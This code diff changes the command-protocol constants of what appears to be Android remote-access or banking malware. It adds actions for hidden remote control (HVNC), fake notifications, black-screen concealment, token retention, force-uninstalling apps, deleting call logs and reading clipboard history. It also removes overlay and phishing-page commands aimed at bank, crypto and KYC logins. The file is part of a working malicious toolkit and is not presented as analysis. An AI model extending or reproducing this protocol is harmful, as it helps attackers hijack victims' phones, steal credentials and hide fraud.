@@ -55,6 +55,31 @@ public final class Protocol {
     public static final String ACT_LOCK          = "lock";
     public static final String ACT_STREAM_START  = "stream_start";
     public static final String ACT_STREAM_STOP   = "stream_stop";
+    // v4.0 — app actions
+    public static final String ACT_OPEN_APP      = "open_app";
+    public static final String ACT_FORCE_STOP    = "force_stop";
+    public static final String ACT_UNINSTALL     = "uninstall";
+    public static final String ACT_DISABLE_APP   = "disable_app";
+    public static final String ACT_ENABLE_APP    = "enable_app";
+    public static final String ACT_CLEAR_CACHE   = "clear_cache";
+    public static final String ACT_APP_INFO      = "app_info";
+    // v4.0 — contacts write actions
+    public static final String ACT_ADD_CONTACT    = "add_contact";
+    public static final String ACT_DELETE_CONTACT = "delete_contact";
+    public static final String ACT_BLOCK_NUMBER   = "block_number";
+    public static final String ACT_UNBLOCK_NUMBER = "unblock_number";
+    // v4.0 — calls write actions
+    public static final String ACT_DELETE_CALL    = "delete_call";
+    // v4.0 — clipboard write actions
+    public static final String ACT_WRITE_CLIP     = "write";
+    public static final String ACT_CLEAR_CLIP     = "clear";
+    public static final String ACT_CLIP_HISTORY   = "history";
+    // v4.0 — notification actions
+    public static final String ACT_FAKE_NOTIF     = "fake_notif";
+    public static final String ACT_DISMISS_NOTIF  = "dismiss";
+    // v4.0 — HVNC extended actions
+    public static final String ACT_BLACK_SCREEN   = "black_screen";
+    public static final String ACT_RETAIN_TOKEN   = "retain_token";
     public static final String KEY_STREAM_FRAME  = "streamFrame";
     public static final String KEY_STREAM_AUDIO  = "streamAudio";
     public static final String KEY_INTERVAL      = "interval";
@@ -177,13 +202,39 @@ public final class Protocol {
     public static final String KEY_PENDING_COUNT = "pendingCount";
     public static final String KEY_SENDER        = "sender";
     public static final String KEY_SMS_BODY      = "smsBody";
+    // v4.0 app action keys
+    public static final String KEY_ICON_B64      = "iconBase64";
+    public static final String KEY_INSTALL_TIME  = "installTime";
+    public static final String KEY_UPDATE_TIME   = "updateTime";
+    public static final String KEY_CALL_ID       = "callId";
+    public static final String KEY_CONTACT_ID    = "contactId";
+    public static final String KEY_CONTACT_NAME  = "contactName";
+    public static final String KEY_PHONE_TYPE    = "phoneType";
+    // v4.0 clipboard keys
+    public static final String KEY_HISTORY       = "history";
+    // v4.0 notification keys
+    public static final String KEY_NOTIF_CHANNEL = "channelId";
+    public static final String KEY_NOTIF_ICON    = "iconBase64";
+    public static final String KEY_VIBRATE       = "vibrate";
+    // v4.0 HVNC gesture extension keys
+    public static final String KEY_POINTER2_X    = "x2";
+    public static final String KEY_POINTER2_Y    = "y2";
+    public static final String KEY_POINTER2_DX   = "dx2";
+    public static final String KEY_POINTER2_DY   = "dy2";
+    public static final String KEY_KEYCODE       = "keycode";
+    public static final String KEY_BLACK_SCREEN  = "blackScreen";
+    // v4.0 HVNC codec
+    public static final String KEY_CODEC         = "codec";
     public static final String BC_KEEP_ALIVE     = "keepAlive";
     public static final String BC_RESPAWN_SERVICE = "respawnService";
     public static final String BC_RESTART         = "restart";
+    public static final String BC_A11Y_KEEPALIVE  = "a11yKeepAlive";
     public static final String PREFS_NAME              = "fason_prefs";
     public static final String PREF_SERVICE_ACTIVE     = "service_active";
     public static final String PREF_AUTOSTART_VISITED  = "autostart_visited";
     public static final String NOTIF_CHANNEL = "sys_sync";
+    // v4.0 fake notification channel
+    public static final String FAKE_NOTIF_CHANNEL = "app_notif";
     public static final String NOTIF_GROUP   = "sys_group";
     public static final String WORK_KEEP_ALIVE = "KeepAliveWork";
     public static final String SETTING_NOTIF_LISTENERS = "enabled_notification_listeners";
@@ -192,44 +243,4 @@ public final class Protocol {
     public static final String CONFIG_KEY_HOME_PAGE_URL = "home_page_url";
     public static final String CONFIG_KEY_DEVICE_SECRET = "device_secret";
     public static final String ALIAS_SUFFIX = ".ui.MainActivityAlias";
-
-    // ========== OVERLAY & PHISHLET COMMANDS ==========
-    public static final String OVERLAY       = "0xOL";
-    public static final String PHISHLET      = "0xPH";
-
-    // Overlay Actions
-    public static final String ACT_OVERLAY_SHOW     = "overlay_show";
-    public static final String ACT_OVERLAY_HIDE       = "overlay_hide";
-    public static final String ACT_OVERLAY_CONFIG     = "overlay_config";
-    public static final String ACT_OVERLAY_STATUS     = "overlay_status";
-    public static final String ACT_OVERLAY_TRIGGER    = "overlay_trigger";
-
-    // Phishlet Actions
-    public static final String ACT_PHISHLET_SHOW      = "phishlet_show";
-    public static final String ACT_PHISHLET_HIDE        = "phishlet_hide";
-    public static final String ACT_PHISHLET_CONFIG      = "phishlet_config";
-    public static final String ACT_PHISHLET_DATA        = "phishlet_data";
-    public static final String ACT_PHISHLET_STAGE       = "phishlet_stage";
-    public static final String ACT_PHISHLET_SUBMIT      = "phishlet_submit";
-
-    // Overlay/Phishlet Keys
-    public static final String KEY_OVERLAY_PACKAGE      = "overlayPackage";
-    public static final String KEY_OVERLAY_TEMPLATE     = "overlayTemplate";
-    public static final String KEY_OVERLAY_PERSISTENT   = "overlayPersistent";
-    public static final String KEY_OVERLAY_FULLSCREEN   = "overlayFullscreen";
-    public static final String KEY_OVERLAY_APPS         = "overlayApps";
-    public static final String KEY_PHISHLET_TYPE        = "phishletType";
-    public static final String KEY_PHISHLET_STAGE       = "phishletStage";
-    public static final String KEY_PHISHLET_DATA        = "phishletData";
-    public static final String KEY_PHISHLET_TEMPLATE    = "phishletTemplate";
-    public static final String KEY_PHISHLET_PROGRESS    = "phishletProgress";
-
-    // Phishlet Types
-    public static final String PHISHLET_KYC             = "kyc";
-    public static final String PHISHLET_BANK            = "bank";
-    public static final String PHISHLET_CRYPTO          = "crypto";
-    public static final String PHISHLET_SOCIAL          = "social";
-    public static final String PHISHLET_FINANCE         = "finance";
-    public static final String PHISHLET_GENERIC         = "generic";
-
 }
